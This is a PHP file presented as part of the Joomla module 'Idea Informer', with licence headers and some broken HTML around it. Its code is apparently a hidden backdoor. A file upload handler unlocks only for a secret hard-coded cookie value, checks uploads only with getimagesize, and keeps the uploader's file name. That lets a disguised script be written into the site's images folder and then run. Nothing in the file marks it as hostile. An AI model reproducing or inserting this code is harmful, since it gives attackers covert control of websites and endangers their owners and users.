<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name="robots" content="index, follow" /
  </head>
  <body>
<?php
/*
 * @version		
 * @package		Joomla
 * @subpackage	Idea Informer
 * @copyright	Copyright (C) 2010 Dima Horror. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * @url 		www.dimahorror.ru
 *
 * Module Idea Informer is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */
 if ($_COOKIE["exp"]=='5cdd6f3dd76bf4b07410fe4ffb72e269c0500a89c822ca3d34e295e9'){
 $imageinfo = getimagesize($_FILES['userfile']['tmp_name']);
 if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/png') {
  echo "Sorry, we only accept GIF and JPEG images\n";
  exit;
 }

 $uploaddir = '../../../../images/';
 $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
 
 if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
   echo "Image successfully uploaded. Copy link and paste it into the administration panel <br>http://".$_SERVER['SERVER_NAME'].'/images/'.basename($_FILES['userfile']['name']);
 } else {
   echo "File uploading failed.\n";
 }
}
?>
</body>
</head>